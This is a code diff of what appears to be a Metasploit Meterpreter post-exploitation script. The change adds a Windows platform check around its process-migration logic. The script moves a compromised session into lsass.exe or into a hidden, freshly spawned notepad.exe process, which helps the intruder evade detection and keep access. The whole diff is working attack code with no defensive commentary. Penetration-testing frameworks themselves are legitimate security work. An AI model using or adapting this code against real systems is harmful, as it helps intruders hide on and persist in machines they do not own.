@@ -28,40 +28,45 @@ opts.parse(args) { |opt, idx, val|
 
 
 
+if client.platform =~ /win32|win64/
+	server = client.sys.process.open
 
-server = client.sys.process.open
+	print_status("Current server process: #{server.name} (#{server.pid})")
 
-print_status("Current server process: #{server.name} (#{server.pid})")
+	target_pid = nil
 
-target_pid = nil
+	if ! spawn
+		# Get the target process name
+		target ||= "lsass.exe"
+		print_status("Migrating to #{target}...")
 
-if ! spawn
-	# Get the target process name
-	target ||= "lsass.exe"
-	print_status("Migrating to #{target}...")
+		# Get the target process pid
+		target_pid = client.sys.process[target]
 
-	# Get the target process pid
-	target_pid = client.sys.process[target]
-
-	if not target_pid
-		print_error("Could not access the target process")
-		print_status("Spawning a notepad.exe host process...")
-		note = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })
-		target_pid = note.pid
+		if not target_pid
+			print_error("Could not access the target process")
+			print_status("Spawning a notepad.exe host process...")
+			note = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })
+			target_pid = note.pid
+		end
+	else
+		target ||= "notepad.exe"
+		print_status("Spawning a #{target} host process...")
+		newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
+		target_pid = newproc.pid
+		if not target_pid
+			print_error("Could not create a process around #{target}")
+			raise Rex::Script::Completed
+		end
 	end
+
+	# Do the migration
+	print_status("Migrating into process ID #{target_pid}")
+	client.core.migrate(target_pid)
+	server = client.sys.process.open
+	print_status("New server process: #{server.name} (#{server.pid})")
+
 else
-	target ||= "notepad.exe"
-	print_status("Spawning a #{target} host process...")
-	newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
-	target_pid = newproc.pid
-	if not target_pid
-		print_error("Could not create a process around #{target}")
-		raise Rex::Script::Completed
-	end
+	print_error("This version of Meterpreter is not supported with this Script!")
+	raise Rex::Script::Completed
 end
-
-# Do the migration
-print_status("Migrating into process ID #{target_pid}")
-client.core.migrate(target_pid)
-server = client.sys.process.open
-print_status("New server process: #{server.name} (#{server.pid})")
